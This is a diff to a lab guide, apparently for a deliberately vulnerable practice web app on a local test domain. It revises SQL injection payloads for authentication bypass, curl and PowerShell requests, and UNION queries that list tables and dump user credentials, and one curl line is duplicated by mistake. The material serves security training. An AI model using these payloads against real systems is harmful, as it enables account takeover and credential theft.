@@ -114,14 +114,21 @@ On Windows, edit `C:\Windows\System32\drivers\etc\hosts`
 
 **Payload Examples**:
 ```sql
-Username: admin' OR '1'='1
+# Basic boolean-based injection
+Username: admin' OR 1=1-- 
 Password: anything
 
-Username: admin'--
+# Comment-based injection
+Username: admin'-- 
 Password: (empty)
 
-Username: ' UNION SELECT null, username, password, null FROM users--
+# Union-based injection
+Username: ' UNION SELECT 1,username,password,email,role,created_at,updated_at FROM users-- 
 Password: (empty)
+
+# Alternative boolean injection
+Username: admin' OR 'x'='x
+Password: anything
 ```
 
 **Risk**: Full database extraction, authentication bypass, data manipulation
@@ -363,7 +370,14 @@ curl -X POST http://techsolutions.com.test:3000/api/login \
 ```bash
 curl -X POST http://techsolutions.com.test:3000/api/login \
   -H "Content-Type: application/json" \
-  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"anything"}'
+  -d '{"username":"admin'\'' OR 1=1-- ","password":"anything"}'
+  -d '{"username":"admin'\'' OR 1=1-- ","password":"anything"}'
+
+# Using PowerShell (Windows):
+# Create payload file first:
+echo '{"username":"admin'\'' OR 1=1-- ","password":"anything"}' > payload.json
+Invoke-WebRequest -Uri "http://techsolutions.com.test:3000/api/auth/login" `
+  -Method POST -ContentType "application/json" -InFile "payload.json"
 ```
 
 3. **Extract database structure**:
@@ -371,14 +385,14 @@ curl -X POST http://techsolutions.com.test:3000/api/login \
 # Get table names
 curl -X POST http://techsolutions.com.test:3000/api/login \
   -H "Content-Type: application/json" \
-  -d '{"username":"'\'' UNION SELECT null,table_name,null,null FROM information_schema.tables--","password":""}'
+  -d '{"username":"'\'' UNION SELECT 1,table_name,2,3,4,5,6 FROM information_schema.tables WHERE table_schema=database()-- ","password":""}'
 ```
 
 4. **Dump user credentials**:
 ```bash
 curl -X POST http://techsolutions.com.test:3000/api/login \
   -H "Content-Type: application/json" \
-  -d '{"username":"'\'' UNION SELECT id,username,password,email FROM users--","password":""}'
+  -d '{"username":"'\'' UNION SELECT 1,username,password,email,role,created_at,updated_at FROM users-- ","password":""}'
 ```
 
 5. **Automate with SQLMap**:
